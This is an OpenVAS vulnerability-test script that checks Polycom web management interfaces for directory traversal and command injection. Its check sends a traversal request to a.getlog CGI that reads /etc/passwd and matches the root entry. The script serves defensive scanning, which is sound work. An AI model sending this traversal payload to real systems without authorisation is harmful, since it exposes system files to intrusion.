###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_polycom_products_52301.nasl 12 2013-10-27 11:15:33Z jan $
#
# Polycom Products Directory Traversal and Command Injection Vulnerabilities
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_summary = "Multiple Polycom products are prone to a directory-traversal
vulnerability and a command-injection vulnerability because it fails
to sufficiently sanitize user-supplied input.

Remote attackers can use a specially crafted request with directory-
traversal sequences ('../') to retrieve arbitrary files in the context
of the application. Also, attackers can execute arbitrary commands
with the privileges of the user running the application.";

tag_solution = "Updates are available. Please see the references for more information.";

if (description)
{
 script_id(103442);
 script_bugtraq_id(52301);
 script_version ("$Revision: 12 $");

 script_name("Polycom Products Directory Traversal and Command Injection Vulnerabilities");

desc = "
 Summary:
 " + tag_summary + "
 Solution:
 " + tag_solution;


 script_tag(name:"cvss_base", value:"7.5");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_tag(name:"risk_factor", value:"High");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 12:15:33 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2012-03-06 10:45:23 +0100 (Tue, 06 Mar 2012)");
 script_description(desc);
 script_summary("Determine if traversal attack is possible");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2012 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "solution" , value : tag_solution);
   script_tag(name : "summary" , value : tag_summary);
 }
 script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/52301");
 script_xref(name : "URL" , value : "http://seclists.org/fulldisclosure/2012/Mar/18?utm_source=twitterfeed&amp;utm_medium=twitter");
 script_xref(name : "URL" , value : "http://blog.tempest.com.br/joao-paulo-campello/path-traversal-on-polycom-web-management-interface.html");
 script_xref(name : "URL" , value : "http://www.polycom.com/");
 script_xref(name : "URL" , value : "http://blog.tempest.com.br/joao-paulo-campello/polycom-web-management-interface-os-command-injection.html");
 exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");
   
port = get_http_port(default:80);
if(!get_port_state(port))exit(0);

banner = get_http_banner(port:port);
if(!banner || "Server: lighttpd" >!< banner)exit(0);

url = string(dir, "/a_getlog.cgi?name=../../../etc/passwd"); 

if(http_vuln_check(port:port, url:url,pattern:"root:.*:0:[01]:.*")) {
     
  security_hole(port:port);
  exit(0);

}

exit(0);

